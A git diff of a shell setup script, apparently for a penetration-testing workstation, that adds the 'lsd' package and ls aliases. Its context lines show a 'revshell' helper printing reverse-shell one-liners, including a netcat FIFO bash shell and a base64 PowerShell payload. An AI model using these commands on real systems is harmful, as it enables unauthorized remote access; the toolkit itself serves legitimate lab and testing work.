@@ -72,7 +72,7 @@ REPOS=(
   "https://github.com/gitleaks/gitleaks.git"
 )
 
-APT_PACKAGES=(curl wget gcc make build-essential fzf golang-go python3 python3-pip python3-venv pipx parallel jq unzip git docker.io docker-compose cargo zsh tmux ligolo-mp)
+APT_PACKAGES=(curl wget gcc make build-essential fzf golang-go python3 python3-pip python3-venv pipx parallel jq unzip git docker.io docker-compose cargo zsh tmux ligolo-mp lsd)
 
 # ========== Utilities ==========
 repo_name_from_url() {
@@ -497,6 +497,13 @@ revshell(){
   echo "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
   echo "[+] PowerShell (Base64): powershell -e $ps_base64"
 }
+
+# Aliases
+alias ls='lsd'
+alias l='lsd -l'
+alias la='lsd -a'
+alias lla='lsd -la'
+alias lt='lsd --tree'
 
 # Environment variables
 export HTB_TOKEN=""
